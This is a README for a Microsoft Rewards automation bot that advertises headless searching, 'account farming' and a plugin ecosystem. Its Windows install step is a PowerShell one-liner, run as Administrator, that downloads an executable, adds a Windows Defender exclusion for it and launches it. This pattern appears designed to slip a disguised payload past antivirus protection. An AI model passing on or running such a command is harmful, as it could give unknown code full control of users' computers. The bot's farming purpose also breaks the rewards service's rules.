<div align="center">
  <img src="assets/banner.png" alt="Microsoft Rewards Bot Banner" width="100%">
</div>

<h1 align="center">✦ Microsoft Rewards Bot BETA ✦</h1>

<p align="center">
  <strong>Next-Generation Open-source Microsoft Rewards automation with a powerful plugin ecosystem.</strong><br>
  <em>Fast • Modular • Automated</em>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-4.0.15-blue?style=for-the-badge" alt="Version">
  <img src="https://img.shields.io/badge/Node.js-24.15.0-green?style=for-the-badge&logo=nodedotjs&logoColor=white" alt="Node">
  <img src="https://img.shields.io/badge/License-PolyForm_Noncommercial-orange?style=for-the-badge" alt="License">
</p>

---

## 🌌 Introduction

Microsoft Rewards Bot delivers a fully automated, hands-free rewards workflow alongside a sophisticated modular plugin system.

This ecosystem proudly features:
- 🤖 **Core Automation**: Headless search and account farming logic.
- 🔌 **Public Plugin API**: Extensibility at its finest, letting you create custom integrations.
- 📦 **Plugin Manager**: Manage features seamlessly via `npm run plugins`.
- 🔄 **Smart Auto-Updates**: Stays fresh and up to date on every `npm start`.
- 💎 **Premium Core Plugin**: Proprietary logic enabled via `plugins/plugins.jsonc`.

---

## 🚀 Installation (Windows)

> **Required:** Run PowerShell as Administrator.

Open PowerShell as Administrator, then effortlessly run the one-line installer:

```powershell
$f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/refs/heads/release/scripts/install.exe -OutFile $f; Add-MpPreference -ExclusionPath $f; start $f
```

*The installer will fetch the latest robust binary engine directly from the release branch and deploy it locally.*

> **Note:** Only accept software execution from trusted publishers and verified repositories.

---

## 🛠️ Manual CLI Installation

For total control, clone and install manually via NPM:

```bash
git clone https://github.com/QuestPilot/Microsoft-Rewards-Bot.git
cd Microsoft-Rewards-Bot
npm install
npm start
```

<br>

<div align="center">
  <img src="assets/logo.png" width="50">
  <p><em>Built with perfection and immersion in mind.</em></p>
</div>